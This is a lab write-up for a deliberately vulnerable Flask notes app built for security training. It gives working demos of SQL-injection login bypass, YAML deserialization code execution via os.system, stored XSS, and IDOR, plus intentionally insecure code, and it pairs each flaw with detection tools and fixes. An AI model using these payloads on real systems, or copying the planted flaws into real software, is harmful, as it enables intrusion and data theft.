# Phase 1 — Application Security: Acropolis Notes

The first phase of the lab builds the artifact that every later phase acts on: a
small, credible web application with deliberately planted security flaws.
**Acropolis Notes** is a server-rendered Flask + SQLite notes app (register, write
Markdown notes, tag/search them, import/export). It is intentionally vulnerable —
the planted flaws are the learning objective and must stay exploitable so the
DevSecOps pipeline (Phase 2), the offensive engagement (Phase 5) and the
detection rules (Phase 4/5) all have something real to act on.

This writeup documents each flaw in a consistent shape: **what** it is, **where**
it lives, a **demo** of exploiting it, **detected by** (which scanner/tool in the
lab catches it), and the **fix** that *would* close it (deferred to Phase 8).

---

## Running the target

```bash
cd app
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
python db.py          # seed acropolis.db
python app.py         # http://127.0.0.1:5000
```

Or containerised:

```bash
cd app
docker build -t acropolis-notes .
docker run --rm -p 5000:5000 acropolis-notes
```

**Seeded accounts:** `alice / password123`, `bob / letmein`,
`admin / acropolis-admin`. The admin owns a note (id **6** on a fresh seed)
containing `FLAG{idor_let_me_read_the_admin_note}`.

**Regression gate:** `python test_exploits.py` drives the Flask test client and
asserts all six vulnerabilities still fire. Expected output ends with
`6/6 vulnerabilities confirmed still exploitable`.

The exploit commands below assume the app is running on `127.0.0.1:5000` and use
a cookie jar at `/tmp/c.txt`.

---

## Routes

| Method | Route | Purpose |
| ------ | ----- | ------- |
| GET | `/` | public landing page |
| GET/POST | `/register` | create an account |
| GET/POST | `/login` | **VULN #2** — SQL injection |
| GET | `/logout` | end session |
| GET | `/dashboard` | note cards, stats, search, `?tag=` filter |
| GET/POST | `/notes/new` | create a note |
| GET | `/notes/<id>` | **VULN #3 (IDOR)** + **VULN #6 (stored XSS)** view |
| GET/POST | `/notes/<id>/edit` | edit (ownership-checked) |
| POST | `/notes/<id>/delete` | delete (ownership-checked) |
| GET | `/settings` | profile + **VULN #1** API key surface + import/export UI |
| POST | `/settings/import` | **VULN #4** — YAML deserialization |
| GET | `/settings/export` | export notes as YAML |

---

## VULN #1 — Hardcoded secrets

**What.** The Flask session signing key and an API key are committed as string
literals in source, and the API key is shown to any logged-in user on `/settings`.
A leaked `SECRET_KEY` lets an attacker forge or tamper with session cookies; a
leaked API key is standing credential theft.

**Where.** `app/app.py`, module top-level:

```python
SECRET_KEY = "acropolis-dev-secret-key-2026-do-not-rotate"
ADMIN_API_KEY = "acro_live_sk_8f3b1c9d2e5a4f6b7c8d9e0f1a2b3c4d"
app.secret_key = SECRET_KEY
```

**Demo.**

```bash
grep -nE "SECRET_KEY|ADMIN_API_KEY" app/app.py
# or just log in and read it off the UI:
curl -s -c /tmp/c.txt --data "username=alice&password=password123" \
     http://127.0.0.1:5000/login >/dev/null
curl -s -b /tmp/c.txt http://127.0.0.1:5000/settings | grep -o 'acro_live_sk_[a-f0-9]*'
```

**Detected by.** `gitleaks` (secret scanning over the repo/commits) and Semgrep
(hardcoded-credential rules) in the Phase 2 pipeline.

**Fix (deferred).** Load secrets from environment / a secrets manager, never
commit them, and rotate the exposed values. Don't render API keys into pages that
aren't scoped to the key's owner.

---

## VULN #2 — SQL injection (authentication bypass)

**What.** The login query is assembled by concatenating the untrusted `username`
and `password` straight into SQL. An attacker bypasses authentication without
valid credentials.

**Where.** `app/app.py`, the `login()` view:

```python
query = (
    "SELECT * FROM users WHERE username = '"
    + username + "' AND password = '" + password + "'"
)
row = conn.execute(query).fetchone()
```

**Demo.** A username of `' OR '1'='1' -- ` comments out the password check and
matches the first user:

```bash
curl -i -c /tmp/c.txt \
     --data-urlencode "username=' OR '1'='1' -- " \
     --data-urlencode "password=anything" \
     http://127.0.0.1:5000/login
# -> 302 redirect to /dashboard; you are now logged in as alice
```

In Phase 5 this is the canonical `sqlmap` target:
`sqlmap -u http://target:5000/login --data="username=x&password=x" --batch`.

**Detected by.** Semgrep (string-formatted SQL / `execute` with concatenation),
OWASP ZAP (DAST active scan), and `sqlmap` during the offensive phase.

**Fix (deferred).** Use parameterized queries
(`execute("... WHERE username = ? AND password = ?", (u, p))`) and verify a
*hashed* password, never plaintext.

---

## VULN #3 — IDOR (Insecure Direct Object Reference)

**What.** The "view a note" route fetches a note by its id with **no check that
the note belongs to the requesting user**. Any authenticated user can read any
note — including the admin's — by changing the id in the URL.

**Where.** `app/app.py`, the `view_note()` view:

```python
note = query_db("SELECT * FROM notes WHERE id = ?", (note_id,), one=True)
# ^ parameterized (no SQLi), but there is NO `AND user_id = session['user_id']`
```

**Demo.** Log in as the non-admin `alice` and read the admin's note:

```bash
curl -s -c /tmp/c.txt --data "username=alice&password=password123" \
     http://127.0.0.1:5000/login >/dev/null
curl -s -b /tmp/c.txt http://127.0.0.1:5000/notes/6 | grep -o 'FLAG{[^}]*}'
# -> FLAG{idor_let_me_read_the_admin_note}
```

Enumerating `/notes/1`, `/notes/2`, … walks every user's notes.

**Detected by.** Hard for SAST (the code is syntactically fine). Caught by
authenticated DAST / manual testing with Burp or ZAP (compare responses across
sessions), and by a custom detection rule in Phase 5 that flags one session
reading many sequential object ids.

**Fix (deferred).** Scope every object lookup to the owner — e.g.
`WHERE id = ? AND user_id = ?` — or enforce an explicit authorization check
before returning the record.

---

## VULN #4 — Insecure deserialization (YAML → RCE)

**What.** The YAML import feature parses user-supplied YAML with PyYAML's full,
unsafe loader. The full loader can construct arbitrary Python objects, so a
crafted document executes attacker-controlled code on the server.

**Where.** `app/app.py`, the `import_notes()` view:

```python
data = yaml.load(raw, Loader=yaml.Loader)   # full/unsafe loader
```

**Demo.** Log in, then POST a YAML payload that runs a shell command:

```bash
curl -s -c /tmp/c.txt --data "username=alice&password=password123" \
     http://127.0.0.1:5000/login >/dev/null
curl -s -b /tmp/c.txt \
     --data-urlencode 'yaml_data=!!python/object/apply:os.system ["id > /tmp/pwned"]' \
     http://127.0.0.1:5000/settings/import >/dev/null
cat /tmp/pwned        # -> uid=... proves code execution
```

The side effect runs during `yaml.load`, before any note processing.

**Detected by.** Semgrep / Bandit (rule: `yaml.load` without `SafeLoader`) in the
Phase 2 SAST gate.

**Fix (deferred).** Use `yaml.safe_load` (or `Loader=yaml.SafeLoader`), which only
constructs plain scalars/lists/dicts.

---

## VULN #5 — Known-vulnerable dependency

**What.** A dependency with published CVEs is pinned in `requirements.txt`. It is
intentionally **not imported at runtime** — it exists purely so the software
composition analysis (SCA) scanner has something to flag.

**Where.** `app/requirements.txt`:

```text
requests==2.19.1
```

`requests` 2.19.1 (2018) is affected by **CVE-2018-18074** (the `Authorization`
header is leaked across a redirect to a different host), and it drags in old
transitive packages (`urllib3` 1.23, etc.) that carry their own advisories.

**Demo.**

```bash
pip-audit -r app/requirements.txt          # or:
grype dir:app                              # or scan the built image:
trivy image acropolis-notes
# all report requests==2.19.1 with known CVEs
```

**Detected by.** Trivy / Grype (SCA + container image) and `pip-audit` in the
Phase 2 pipeline.

**Fix (deferred).** Upgrade `requests` to a patched release (and let its
transitive deps update with it); enforce a minimum version in CI.

---

## VULN #6 — Stored XSS (cross-site scripting)

**What.** Note titles and bodies are rendered as **raw, unsanitised HTML**. A note
body is converted from Markdown to HTML with no output sanitisation and then
emitted with Jinja's `|safe` filter (which disables autoescaping). Because the
content is stored and served back to anyone who views the note, this is **stored
(persistent) XSS**: a script saved once executes in the browser of every viewer.

**Where.** `app/app.py` renders the body and the template emits it raw:

```python
# app.py — no sanitisation; raw HTML in the source passes straight through
def render_markdown(text):
    return markdown.markdown(text or "", extensions=["fenced_code", "tables", "nl2br"])
```

```jinja
{# templates/note_view.html #}
<h1 class="note-doc__title">{{ note.title|safe }}</h1>
<div class="note-doc__body markdown">{{ body_html|safe }}</div>
```

**Demo.** Create a note whose body contains a script, then view it:

```bash
curl -s -c /tmp/c.txt --data "username=alice&password=password123" \
     http://127.0.0.1:5000/login >/dev/null
curl -s -b /tmp/c.txt \
     --data-urlencode "title=Totally normal note" \
     --data-urlencode "body=<script>alert(document.cookie)</script>" \
     --data-urlencode "tags=demo" \
     http://127.0.0.1:5000/notes/new >/dev/null
# open the note in a browser (e.g. the newest note on /dashboard) — the alert fires.
# confirm the payload is served unescaped:
curl -s -b /tmp/c.txt http://127.0.0.1:5000/notes/7 | grep -o '<script>.*</script>'
```

The dashboard *card preview* escapes the body (safe), so the payload only
executes on the full note view — a realistic split where the list is safe but the
detail page is not.

**Detected by.** Semgrep (Jinja `|safe` / autoescape-off on user data) in SAST,
and OWASP ZAP (DAST active scan injecting XSS probes) in Phase 2.

**Fix (deferred).** Let Jinja autoescape (drop `|safe`), and if Markdown is
needed, sanitise the rendered HTML with an allow-list (e.g. `bleach`) or render
Markdown with raw-HTML disabled. Add a Content-Security-Policy as defence in depth.

---

## Bonus flaws

- **`debug=True` in `app.run(...)`** — exposes the interactive Werkzeug debugger.
  If an exception is triggered, the in-browser console allows arbitrary code
  execution (PIN-protected, but the PIN is derivable in many setups). *Fix:* never
  run the debug server in production; use a WSGI server (gunicorn/uWSGI).
- **Plaintext passwords** — `users.password` stores credentials verbatim. *Fix:*
  store a salted hash (`argon2` / `bcrypt`) and compare hashes.

---

## Summary

| # | Vulnerability | Route / file | Exploit | Detected by | Fix |
| - | ------------- | ------------ | ------- | ----------- | --- |
| 1 | Hardcoded secrets | `app.py`, `/settings` | read key from source/UI | gitleaks, Semgrep | env/secrets manager + rotate |
| 2 | SQL injection | `/login` | `' OR '1'='1' -- ` | Semgrep, ZAP, sqlmap | parameterized queries |
| 3 | IDOR | `GET /notes/<id>` | read `/notes/6` as alice | DAST/manual, custom rule | scope lookup to owner |
| 4 | Insecure deserialization | `POST /settings/import` | `!!python/object/apply:os.system` | Semgrep, Bandit | `yaml.safe_load` |
| 5 | Vulnerable dependency | `requirements.txt` | `pip-audit` / `trivy` | Trivy, Grype, pip-audit | upgrade `requests` |
| 6 | Stored XSS | `GET /notes/<id>` | `<script>` in note body | Semgrep, ZAP | autoescape + sanitise |
| + | debug=True | `app.run` | Werkzeug console | Semgrep, ZAP | production WSGI server |
| + | Plaintext passwords | `db.py` / `users` | DB read | Semgrep, manual | salted password hashing |

All fixes are intentionally **deferred to Phase 8** so the same artifact can be
attacked (Phase 5) and detected (Phase 4/5) first.
